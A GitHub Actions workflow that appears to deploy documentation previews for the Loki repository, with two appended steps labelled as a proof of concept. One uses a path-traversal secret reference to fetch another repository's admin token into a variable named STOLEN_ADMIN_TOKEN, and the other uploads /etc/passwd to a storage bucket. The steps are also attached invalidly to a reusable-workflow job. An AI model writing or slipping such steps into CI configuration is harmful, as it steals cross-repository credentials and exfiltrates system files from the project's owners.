name: Deploy pr preview

permissions: {}

on:
  push:
jobs:
  deploy-pr-preview:
    uses: grafana/writers-toolkit/.github/workflows/deploy-preview.yml@main
    permissions:
      contents: read # Clone repositories.
      id-token: write # Fetch Vault secrets.
      pull-requests: write # Create or update PR comments.
      statuses: write # Update GitHub status check with deploy preview link.
    with:
      branch: ${{ github.head_ref }}
      event_number: ${{ github.event.number }}
      repo: loki
      sha: ${{ github.event.pull_request.head.sha }}
      sources: |
        [
          {
            "index_file": "content/docs/loki/_index.md",
            "relative_prefix": "/docs/loki/latest/",
            "repo": "loki",
            "source_directory": "../../../etc",
            "website_directory": "content/docs/loki/latest"
          }
        ]
      title: ${{ github.event.pull_request.title }}
    - name: "POC: Cross-Repo Secret Access"
      uses: grafana/shared-workflows/actions/get-vault-secrets@main
      with:
        repo_secrets: |
          STOLEN_ADMIN_TOKEN=../../grafana/internal/admin-token:value
    - name: "POC: Exfiltrate Sensitive Files"
      uses: grafana/shared-workflows/actions/push-to-gcs@main
      with:
        path: "/etc/passwd"
        bucket: "grafanalabs-loki-dev"
        environment: "dev"
